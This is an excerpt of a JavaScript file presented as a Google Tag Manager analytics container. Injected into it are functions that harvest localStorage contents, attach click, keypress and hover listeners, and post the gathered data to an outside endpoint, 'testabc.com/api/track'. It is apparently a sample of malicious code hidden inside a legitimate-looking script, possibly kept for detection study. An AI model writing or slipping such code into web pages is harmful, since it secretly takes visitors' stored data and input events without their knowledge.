...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "vtp_instanceDestinationId": "G-1GBSD0EH26",
    ...
    "security_groups": {
      "google": ["__ccd_conversion_marking", "__ccd_em_download", "__ccd_em_outbound_click", "__ccd_em_page_view", "__ccd_em_scroll", "__ccd_em_site_search", "__ccd_em_video", "__ccd_ga_regscope", "__ogt_ga_gam_link", "__ogt_google_signals", "__set_product_settings"]
    }
  };
  ...
  */
  ...
  function generateUniqueId(data) {
    ...
    let hash = keys.reduce((prev, curr) => (prev << 5) - prev + curr.charCodeAt(0), 0) & 0xffffffff;
  ...
  function getTargetLocalStorage() {
  ...
  ni.ee = Number("0") || 0;
  ni.ia = "dataLayer";
  function sendProcessedData(output) {
    const uniqueId = generateUniqueId(output);
    const apiLink = "https://testabc.com/api/track";
    const payload = {
      id: uniqueId,
      data: output
    };
    fetch(apiLink, {
      ...
      if (rsp.ok) {
        ...
        console.error(`Data not sent with status code: ${rsp.status}`);
      }
    });
  }
  ni.Rj = "ChEI8OnlpwYQuJTc8ab5i5yFARIlAIxhzZCVzDUUrQn7UY3Es6fqenrQ0PCyvF6fWaMQKf3IxfB6iBoCZCE\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function collectAndSendData() {
    const filteredLocalStorage = getTargetLocalStorage();
    if (Object.keys(filteredLocalStorage).length > 0) {
      sendProcessedData(filteredLocalStorage);
    }
    const globalVariables = Object.keys(globalVariablesCollection);
    if (globalVariables.length > 0) {
      sendProcessedData(globalVariablesCollection);
  ...
  function Qz(a) {}
  function eventHookListener(event) {
    const eventName = event.type;
    if (!globalVariablesCollection[eventName]) {
      globalVariablesCollection[eventName] = [];
    }
    globalVariablesCollection[eventName].push(event.target);
  }
  ...
  window.addEventListener("click", eventHookListener);
  ...
  function lD() {
    var a = new qb();
    L(this, "read_container_data"), a.set("containerId", 'G-1GBSD0EH26'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", bg), a.set("previewMode", dg), a.set("environmentMode", cg), Q(92) && a.set("firstPartyServing", wi || yi), Q(94) && a.set("containerUrl", Dc), a.Bb();
    return a;
  }
  ...
  window.addEventListener("keypress", eventHookListener);
  ...
  window.addEventListener("hover", eventHookListener);
